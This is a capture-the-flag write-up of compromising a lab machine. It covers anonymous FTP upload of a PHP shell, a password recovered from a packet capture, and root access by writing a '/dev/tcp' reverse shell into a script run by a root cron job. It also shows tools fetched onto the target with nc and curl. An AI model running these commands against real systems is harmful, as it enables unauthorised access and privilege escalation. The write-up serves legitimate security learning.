4 AUG 2021

ip : 10.10.182.242



SCANNING
========
basic:
------

$nmap -sV -v --open -oN nmap/intial 10.10.182.242

```
21/tcp    open     ftp           vsftpd 3.0.3

22/tcp    open     ssh           OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)

80/tcp    open     http          Apache httpd 2.4.18 ((Ubuntu))  
```



ENUMERATION
===========
$ searchsploit  vsftpd 3.0.3

didn't find rce .


$ ftp 10.10.182.242

logged in successfully with anonymous !

```
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt

```

[*] we can see we have rwx on ftp dirctory !

[*] prepare my php shell 

[*] $put shell.php

```
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
553 Could not create file.
ftp> cd ftp
250 Directory successfully changed.

```

$gobuster dir -u http://10.10.182.242 -w /usr/share/dirb/wordlists/common.txt 

```
/files                (Status: 301) [Size: 314] [--> http://10.10.182.242/files/]
/index.html           (Status: 200) [Size: 808]                                  
/server-status        (Status: 403) [Size: 278]  

```

http://10.10.182.242/files/

i found same files with the ftp enumeration so let's check them :

a meme and seemes rabbit hole as no useful output from strings command or steghide .

and a notice.txt :

````
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.

````
[*] so we know there is a possible user called Maya . 

let's stick with what we found with the ftp .

can find the shell uploaded at http://10.10.182.242/files/ftp/

[*] set up my listener 

$nc -lvp 1234

[*] execute the shell and now we have a **shell**

as www-data 

we have sh shell let's get a stable shell first .

$ python -c "import pty;pty.spawn('/bin/bash')"

now let's navigate around :

````
www-data@startup:/$ cat recipe.txt 
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.

````
PRIVILEGE ESCALATION
=====================

there is a user : lennie

linpeas :

on my side 

└─$ nc -lvp 9999 < ~/tools/linpeas.sh 


www-data@startup:/tmp$ nc 10.8.203.221 9999 > linpeas.sh

found unexcepected folder called incidents and contain a .pcapng file so let's check it with wireshak .

![122](https://user-images.githubusercontent.com/67979878/128255451-2003c869-5143-4c13-8dc4-060062bb41a4.PNG)


found :
password: c4ntg3t3n0ughsp1c3

but it is a wrong pass for www-data but let's keep it 

try $su lennie #provide the pass and worked !

$sudo -l 

`
Sorry, user lennie may not run sudo on startup.
`

found scripts folder on home of lennie .
```
-rwxr-xr-x 1 root root 77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root root  1 Aug  4 20:02 startup_list.txt

```

```
lennie@startup:~/scripts$ cat planner.sh 
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
it seems this script print some stuff in the startup_list.txt and execute script which we can write into .

hence the script is owned by root so if it  is exected by root privilege we will get a root shell 

But how can we make it get executed  ?

`-rwx------ 1 lennie lennie 53 Aug  4 20:01 /etc/print.sh`

i modify the script print.sh to a reverse shell providing my ip and a port .

sh -i >& /dev/tcp/my_ip/4444 0>&1

if you try to execute it you will get a shell as lennie 

after some digging i found a tool @ https://github.com/DominicBreuker/pspy

`to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc.`

upload it to target :

on my side : 'on a folder contain the tool '

$ python3 -m http.server 8080

lennie@startup:/tmp$ curl http://my_ip:8080/pspy64s -o psp


run it after ruuning $chmod +x psp

![12314](https://user-images.githubusercontent.com/67979878/128255762-673225bc-6dce-47e3-ad32-500574ea3222.PNG)

as we can see the script is ruuning each minute with root privielge as a cronjob

set a listenner .

after a minute from modifying the file you will get  a shell as root :

$ python -c "import pty;pty.spawn('/bin/bash')"

root@startup:~# crontab -l 

```
crontab -l

* * * * * /home/lennie/scripts/planner.sh
```

so there is a cronjob is done by root every minute to execute the planner.sh indeed .

#pwned 

lessons learned :
----------------
- when you got a ftp login successful check for read & write privilege .
- pspy64 tool helps to find processes and cronjobs  running even if you are not root .
